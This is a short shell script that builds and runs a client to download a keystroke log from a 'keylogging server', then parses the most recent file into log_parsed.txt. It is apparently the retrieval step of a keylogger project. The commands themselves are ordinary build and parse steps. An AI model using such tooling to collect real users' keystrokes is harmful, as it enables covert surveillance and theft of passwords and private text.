# run_client.sh
# 
# Does the following:
# 1. Builds and runs the client, which downloads a semi-parsed log of keystrokes
# 	 from the keylogging server
# 2. Parses the keystrokes using parser.py and saves them into log_parsed.txt 

# build the client

echo ""; echo "***BUILDING THE CLIENT***"; echo ""
make
if [ $? -ne 0 ]; then
	exit
fi

echo ""; echo "***RUNNING THE CLIENT***"; echo ""
./client
if [ $? -ne 0 ]; then
	exit
fi

# parse the log

most_recent_file=$(ls -lt | grep '^-' | head -n1 | awk '{print $9}')
out_file="log_parsed.txt"
echo ""; echo "***PARSING $most_recent_file, saving to $out_file ***"; echo ""
python3 parser.py $most_recent_file $out_file
